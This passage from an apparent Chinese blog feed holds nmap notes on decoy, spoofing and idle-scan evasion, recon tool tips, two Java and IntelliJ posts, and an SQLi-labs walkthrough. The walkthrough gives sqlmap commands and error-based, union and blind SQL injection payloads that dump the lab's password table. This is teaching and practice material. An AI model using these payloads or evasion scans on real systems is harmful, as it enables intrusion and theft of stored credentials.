class="language-none">FIREWALL&#x2F;IDS EVASION AND SPOOFING:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用这个部分.</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 伪造IP-D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys &#x2F;&#x2F; 伪造端口-g&#x2F;--source-port &lt;portnum&gt;: Use given port numbernmap -F -O -D1.1.1.1,2.2.2.2 8.8.8.8 -g996 8.8.8.8 -n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>-D 使用这个命令可可能会让目标主机管理员认为该扫描使用的是诱饵主机进行扫描的，而不是真实的扫描地址，因此会忽略这次扫描，从而，我们可以可以使用自己真实的ip地址进行扫描，以达到欺骗目标主机管理员的目的</p><p>所以原理为，使用虚拟IP作为诱饵让目标主机认为这次仅仅为一次没有用的扫描，从而忽视使防火墙不进行拦截，从而使我们的真实IP获得主机的信息。</p><pre class="line-numbers language-mac欺骗(伪造)" data-language="mac欺骗(伪造)"><code class="language-mac欺骗(伪造)">--spoof-mac &lt;mac address&#x2F;prefix&#x2F;vendor name&gt;: Spoof your MAC address<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="空闲扫描"><a href="#空闲扫描" class="headerlink" title="空闲扫描"></a>空闲扫描</h4><pre class="line-numbers language-nmap" data-language="nmap"><code class="language-nmap">-sI &lt;zombie host[:probeport]&gt;: Idle scan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个指令需要有闲置的端口，那如何去寻找呢？使用脚本。</p><pre class="line-numbers language-nmap" data-language="nmap"><code class="language-nmap">nmap --script ipidseq -iR 100 -oN ipidseq.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>脚本名为ipdiseq，因为不知道哪个ip有空闲端口，所以选择-iR</p><p>如果知道目标网络哪个为闲置端口，选择下面的命令</p><pre class="line-numbers language-nmap" data-language="nmap"><code class="language-nmap">nmap -Pn -sI ip:port destination<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><h3 id="帮助文档"><a href="#帮助文档" class="headerlink" title="帮助文档"></a>帮助文档</h3><pre class="line-numbers language-none"><code class="language-none">TARGET SPECIFICATION:  Can pass hostnames, IP addresses, networks, etc.  Ex: scanme.nmap.org, microsoft.com&#x2F;24, 192.168.0.1; 10.0.0-255.1-254  -iL &lt;inputfilename&gt;: Input from list of hosts&#x2F;networks  -iR &lt;num hosts&gt;: Choose random targets  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts&#x2F;networks  --excludefile &lt;exclude_file&gt;: Exclude list from fileHOST DISCOVERY:  -sL: List Scan - simply list targets to scan  -sn: Ping Scan - disable port scan  -Pn: Treat all hosts as online -- skip host discovery  -PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]: TCP SYN&#x2F;ACK, UDP or SCTP discovery to given ports  -PE&#x2F;PP&#x2F;PM: ICMP echo, timestamp, and netmask request discovery probes  -PO[protocol list]: IP Protocol Ping  -n&#x2F;-R: Never do DNS resolution&#x2F;Always resolve [default: sometimes]  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers  --system-dns: Use OS&#39;s DNS resolver  --traceroute: Trace hop path to each hostSCAN TECHNIQUES:  -sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM: TCP SYN&#x2F;Connect()&#x2F;ACK&#x2F;Window&#x2F;Maimon scans  -sU: UDP Scan  -sN&#x2F;sF&#x2F;sX: TCP Null, FIN, and Xmas scans  --scanflags &lt;flags&gt;: Customize TCP scan flags  -sI &lt;zombie host[:probeport]&gt;: Idle scan  -sY&#x2F;sZ: SCTP INIT&#x2F;COOKIE-ECHO scans  -sO: IP protocol scan  -b &lt;FTP relay host&gt;: FTP bounce scanPORT SPECIFICATION AND SCAN ORDER:  -p &lt;port ranges&gt;: Only scan specified ports    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning  -F: Fast mode - Scan fewer ports than the default scan  -r: Scan ports consecutively - don&#39;t randomize  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;SERVICE&#x2F;VERSION DETECTION:  -sV: Probe open ports to determine service&#x2F;version info  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)                                                                                                                                            --version-light: Limit to most likely probes (intensity 2)                                                                                                                                                       --version-all: Try every single probe (intensity 9)                                                                                                                                                              --version-trace: Show detailed version scan activity (for debugging)                                                                                                                                           SCRIPT SCAN:                                                                                                                                                                                                       -sC: equivalent to --script&#x3D;default                                                                                                                                                                              --script&#x3D;&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of                                                                                                                                                        directories, script-files or script-categories                                                                                                                                                          --script-args&#x3D;&lt;n1&#x3D;v1,[n2&#x3D;v2,...]&gt;: provide arguments to scripts                                                                                                                                                  --script-args-file&#x3D;filename: provide NSE script args in a file                                                                                                                                                   --script-trace: Show all data sent and received  --script-updatedb: Update the script database.  --script-help&#x3D;&lt;Lua scripts&gt;: Show help about scripts.           &lt;Lua scripts&gt; is a comma-separated list of script-files or           script-categories.OS DETECTION:  -O: Enable OS detection  --osscan-limit: Limit OS detection to promising targets  --osscan-guess: Guess OS more aggressivelyTIMING AND PERFORMANCE:  Options which take &lt;time&gt; are in seconds, or append &#39;ms&#39; (milliseconds),  &#39;s&#39; (seconds), &#39;m&#39; (minutes), or &#39;h&#39; (hours) to the value (e.g. 30m).  -T&lt;0-5&gt;: Set timing template (higher is faster)  --min-hostgroup&#x2F;max-hostgroup &lt;size&gt;: Parallel host scan group sizes  --min-parallelism&#x2F;max-parallelism &lt;numprobes&gt;: Probe parallelization  --min-rtt-timeout&#x2F;max-rtt-timeout&#x2F;initial-rtt-timeout &lt;time&gt;: Specifies      probe round trip time.  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.  --host-timeout &lt;time&gt;: Give up on target after this long  --scan-delay&#x2F;--max-scan-delay &lt;time&gt;: Adjust delay between probes  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per secondFIREWALL&#x2F;IDS EVASION AND SPOOFING:  -f; --mtu &lt;val&gt;: fragment packets (optionally w&#x2F;given MTU)  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys  -S &lt;IP_Address&gt;: Spoof source address  -e &lt;iface&gt;: Use specified interface  -g&#x2F;--source-port &lt;portnum&gt;: Use given port number  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP&#x2F;SOCKS4 proxies  --data &lt;hex string&gt;: Append a custom payload to sent packets  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets  --data-length &lt;num&gt;: Append random data to sent packets  --ip-options &lt;options&gt;: Send packets with specified ip options  --ttl &lt;val&gt;: Set IP time-to-live field  --spoof-mac &lt;mac address&#x2F;prefix&#x2F;vendor name&gt;: Spoof your MAC address  --badsum: Send packets with a bogus TCP&#x2F;UDP&#x2F;SCTP checksumOUTPUT:  -oN&#x2F;-oX&#x2F;-oS&#x2F;-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,     and Grepable format, respectively, to the given filename.  -oA &lt;basename&gt;: Output in the three major formats at once  -v: Increase verbosity level (use -vv or more for greater effect)  -d: Increase debugging level (use -dd or more for greater effect)  --reason: Display the reason a port is in a particular state  --open: Only show open (or possibly open) ports  --packet-trace: Show all packets sent and received  --iflist: Print host interfaces and routes (for debugging)  --append-output: Append to rather than clobber specified output files  --resume &lt;filename&gt;: Resume an aborted scan  --stylesheet &lt;path&#x2F;URL&gt;: XSL stylesheet to transform XML output to HTML  --webxml: Reference stylesheet from Nmap.Org for more portable XML  --no-stylesheet: Prevent associating of XSL stylesheet w&#x2F;XML outputMISC:  -6: Enable IPv6 scanning  -A: Enable OS detection, version detection, script scanning, and traceroute  --datadir &lt;dirname&gt;: Specify custom Nmap data file location  --send-eth&#x2F;--send-ip: Send using raw ethernet frames or IP packets  --privileged: Assume that the user is fully privileged  --unprivileged: Assume the user lacks raw socket privileges  -V: Print version number  -h: Print this help summary page.EXAMPLES:  nmap -v -A scanme.nmap.org  nmap -v -sn 192.168.0.0&#x2F;16 10.0.0.0&#x2F;8  nmap -v -iR 10000 -Pn -p 80SEE THE MAN PAGE (https:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man.html) FOR MORE OPTIONS AND EXAMPLES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>域名的核心是域名系统（英语：Domain Name System，缩写：DNS），域名系统中的任何名称都是域名。在域名系统的层次结构中，各种域名都隶属于域名系统根域的下级。域名的第一级是顶级域，它包括通用顶级域，例如.com、.net和.org；以及国家和地区顶级域，例如.us、.cn和.tk。顶级域名下一层是二级域名，一级一级地往下。现在，还有一些新兴的中文域名，例如.在线等。这些域名向人们提供注册服务，人们可以用它创建公开的互联网资源或运行网站。顶级域名的管理服务由对应的域名注册管理机构（域名注册局）负责，注册服务通常由域名注册商负责[2]。</p><h3 id="获得方式"><a href="#获得方式" class="headerlink" title="获得方式"></a>获得方式</h3><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><h4 id="域传输漏洞"><a href="#域传输漏洞" class="headerlink" title="域传输漏洞"></a>域传输漏洞</h4><h4 id="证书子域名"><a href="#证书子域名" class="headerlink" title="证书子域名"></a>证书子域名</h4><h4 id="HTTP头跨域策略文件"><a href="#HTTP头跨域策略文件" class="headerlink" title="HTTP头跨域策略文件"></a>HTTP头跨域策略文件</h4><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><p>site：*.baidu.com </p><h4 id="其他搜索引擎"><a href="#其他搜索引擎" class="headerlink" title="其他搜索引擎"></a>其他搜索引擎</h4><p><a href="https://developers.facebook.com/tools/ct">https://developers.facebook.com/tools/ct</a></p><p><a href="https://crt.sh/">https://crt.sh/</a></p><p><a href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a></p><p><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></p><h4 id="公开信息"><a href="#公开信息" class="headerlink" title="公开信息"></a>公开信息</h4><h4 id="robot-txt"><a href="#robot-txt" class="headerlink" title="robot.txt"></a>robot.txt</h4><p><img src="robort.txt.png"></p><p>会存放子域名，只要用于表明可以使用爬虫的网站</p><h3 id="Maltego-的使用"><a href="#Maltego-的使用" class="headerlink" title="Maltego 的使用"></a>Maltego 的使用</h3><p><img src="maltego1.png"></p><h3 id="OneForAll的使用"><a href="#OneForAll的使用" class="headerlink" title="OneForAll的使用"></a>OneForAll的使用</h3><pre class="line-numbers language-none"><code class="language-none">python oneforall.py --target example.com run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="网站指纹识别"><a href="#网站指纹识别" class="headerlink" title="网站指纹识别"></a>网站指纹识别</h2><h3 id="whatruns"><a href="#whatruns" class="headerlink" title="whatruns"></a>whatruns</h3><h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><h2 id="网站目录扫描"><a href="#网站目录扫描" class="headerlink" title="网站目录扫描"></a>网站目录扫描</h2><h3 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h3><p>爬虫</p><p>打开网站即可使用。</p><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p>暴力破解</p><pre class="line-numbers language-none"><code class="language-none">python3 dirsearch.py -u www.XXX.com -e*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="jaeles的使用"><a href="#jaeles的使用" class="headerlink" title="jaeles的使用"></a>jaeles的使用</h3><p>./jaeles -u url</p><h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><p>nikto -h url</p><p>具体可以看看文档。</p><p>nmap 可以和 Nikto结合。</p><h3 id="Wafwoof"><a href="#Wafwoof" class="headerlink" title="Wafwoof"></a>Wafwoof</h3><p>发现waf</p><p>加-u即可</p><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><h3 id="proxychain-h-与-tor"><a href="#proxychain-h-与-tor" class="headerlink" title="proxychain-h 与 tor"></a>proxychain-h 与 tor</h3><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>简单地说就是储存信息的设备，会将源站的信息储存然后返回给你，从而导致无法攻击目标</p><h3 id="CDN检测"><a href="#CDN检测" class="headerlink" title="CDN检测"></a>CDN检测</h3><p>whichCDN</p><h3 id="查找源IP而非CDN"><a href="#查找源IP而非CDN" class="headerlink" title="查找源IP而非CDN"></a>查找源IP而非CDN</h3><h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><p>设一个套让你钻，里面。然后就可以获得你的攻击方式。</p><h3 id="Hfish"><a href="#Hfish" class="headerlink" title="Hfish"></a>Hfish</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>端口扫描-》子域名的搜集-》指纹识别（可以通过识别来寻找漏洞）-》目录扫描 </p><p>子域名可能会与域名有很多关系</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IntelliJ IDEA使用</title>
      <link href="/2021/09/11/intellij-idea-shi-yong/"/>
      <url>/2021/09/11/intellij-idea-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="config目录"><a href="#config目录" class="headerlink" title="config目录"></a>config目录</h3><h2 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h2><p>在项目中有不同模块实现不同功能。分布式开发很有用</p><p>右击Project即可创建</p><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>右击然后代开Open Module Setting</p><p>然后再右击寻找delete</p><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><ol><li>执行 ctrl+shift+F10</li><li>提示补全</li><li>当行注释：ctrl + /</li><li>多行注释：ctrl + shift + /</li><li>复制一行：ctrl+d</li><li>删除一行：ctrl+y</li><li>redo： ctrl+y</li><li>快捷的创建一些方法：alt+insert</li><li>万能快捷键，导包、生成变量：alt + enter</li><li>重命名：ctrl+R</li><li>for循环：fori</li><li>代码块包围 ctrl+alt+t</li><li>查找一些类，并进入类：ctrl+n</li><li>缩进/取消缩进: tab, shift + tab</li><li>Ctrl+P：查看方法参数</li><li>Ctrl+Q：查看类、方法、属性注释</li></ol><ol><li>新建包或者类时可以使用 alt+insert</li><li>快捷输出一个变量a时，可以使用a.sout进行快捷输出</li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java概述</title>
      <link href="/2021/09/11/java-gai-shu/"/>
      <url>/2021/09/11/java-gai-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="JDK（java-Development-Kit）"><a href="#JDK（java-Development-Kit）" class="headerlink" title="JDK（java Development Kit）"></a>JDK（java Development Kit）</h3><p>JDK是提供给Java开发人员使用的，其中包含java的开发工具，也包含了JRE。</p><p>其中的开发工具javac.exe，jar.exe</p><h3 id="JRE-java-Runtime-Enviroment"><a href="#JRE-java-Runtime-Enviroment" class="headerlink" title="JRE(java Runtime Enviroment)"></a>JRE(java Runtime Enviroment)</h3><p>包含了JVM（Java虚拟机）和Java程序所需的核心类库。如果只想运行java程序只需要有JRE即可</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><h4 id="文档注释"><a href="#文档注释" class="headerlink" title="文档注释"></a>文档注释</h4><p>格式：<br>/**<br>  @auther<br>  @version<br>*/</p><p>注释内容可以被JDK提供的工具javadoc所解析，生成一套以网页文件形式体现的该程序的说明文档。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ol><li><p>JDK、JRE、JVM三者之间的关系</p></li><li><p>为什么要配置path环境变量</p></li><li><p>常用命令行操作</p></li></ol><h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>变量、方法和类。（凡是自己起名的地方都叫标识符）</p><h3 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h3><ol><li><p>包名：多单词所有字母都小写</p></li><li><p>类名，借口名：多单词组成时，所有单词首字母大写</p></li><li><p>变量名、方法名：首字母不大写，后面单词大写</p></li><li><p>常量名：所有字母大写 </p></li><li><p>见名知意</p></li></ol><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ol><li><p>字符串</p></li><li><p>整形</p></li><li><p>浮点型</p></li></ol><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>同一作用域只能作用在一个作用域中.</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h4><p>byte, int, long, float, double</p><p>byte: 1字节(8bit) -128-127</p><h4 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h4><p>boolen</p><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>char</p><h4 id="reference-type"><a href="#reference-type" class="headerlink" title="reference type"></a>reference type</h4><p>class, interface, array</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLLABS</title>
      <link href="/2021/09/10/sqllabs/"/>
      <url>/2021/09/10/sqllabs/</url>
      
        <content type="html"><![CDATA[<h2 id="Basic-Challenge"><a href="#Basic-Challenge" class="headerlink" title="Basic Challenge"></a>Basic Challenge</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap:"></a>sqlmap:</h4><p>使用联合查询为例，其他查询只需要修改–technique=U即可</p><p>发现注入点</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现数据库</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v3 -dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果</p><pre class="line-numbers language-none"><code class="language-none">[*] ctftraining[*] information_schema[*] mysql[*] performance_schema[*] security[*] test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查询数据库security中表</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v 3 --tables -D security<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果</p><pre class="line-numbers language-none"><code class="language-none">+----------+| emails   || referers || uagents  || users    |+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查询user表中的列</p><p>语句</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v 3 --columns -D security -T users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得列内数据</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v 3 --columns -D security -T users -C password -dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>发现用户</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;1&#39; AND (SELECT 1710 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT (ELT(1710&#x3D;1710,1))),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TBlX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现数据库</p><pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查security中表，如果查看其他库记得修改table_schema in()</p><pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_name) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES  WHERE table_schema IN (0x7365637572697479)LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看列</p><pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7E,(SELECT MID((IFNULL(CAST((column_name) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;&quot;users&quot; AND table_schema&#x3D;&quot;security&quot; LIMIT 0,1),0x7E,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看列中内容</p><pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT MID((IFNULL(CAST((password) AS NCHAR),0x20)),1,54) FROM security.users LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>获得用户名:</p><pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7E,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),0x7E,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现数据库</p><pre class="line-numbers language-none"><code class="language-none">-6497&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x7E,IFNULL(CAST(schema_name AS NCHAR),0x20),0x7E) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1)-- -获得其他数据库修改LIMIT a,1 中的a即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查询数据库security中表</p><pre class="line-numbers language-none"><code class="language-none">-8335&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x7E,IFNULL(CAST(table_name AS NCHAR),0x20),0x7E) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x7365637572697479) LIMIT 0,1)-- -获得其他表修改LIMIT a,1 中的a即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查询user表中的列</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;--5520&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x7E,IFNULL(CAST(column_name AS NCHAR),0x20),0x7E,IFNULL(CAST(column_type AS NCHAR),0x20),0x7E) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;&quot;users&quot; AND table_schema&#x3D;&quot;security&quot; LIMIT 1,1)-- -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得数据</p><pre class="line-numbers language-none"><code class="language-none">一次获得全部数据:-4235&#39; UNION ALL SELECT NULL,NULL,(SELECT GROUP_CONCAT(IFNULL(CAST(password AS NCHAR),0x20),0x7E,IFNULL(CAST(password AS NCHAR),0x20),0x3c62723e) FROM security.users ORDER BY id)-- -一次获得一条:-4235&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x7E,IFNULL(CAST(password AS NCHAR),0x20),0x7E) FROM security.users ORDER BY id LIMIT 5,1)-- -?id&#x3D;-1&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)-- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>数据库第一个字母的 ascii 码为 115，即s</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错&amp;联合&amp;盲注</td><td>id=$id</td></tr></tbody></table><p>仅仅与Less-1的闭合方式不同</p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错&amp;联合&amp;盲注</td><td>id=(‘$id’)</td></tr></tbody></table><p>仅仅与Less-1的闭合方式不同</p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错&amp;联合&amp;盲注</td><td>id=(“$id”)</td></tr></tbody></table><p>仅仅与Less-1的闭合方式不同</p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错&amp;盲注</td><td>id=’$id’</td></tr></tbody></table><p>无回显，但是会显示错误，所以可以使用报错与盲注</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" 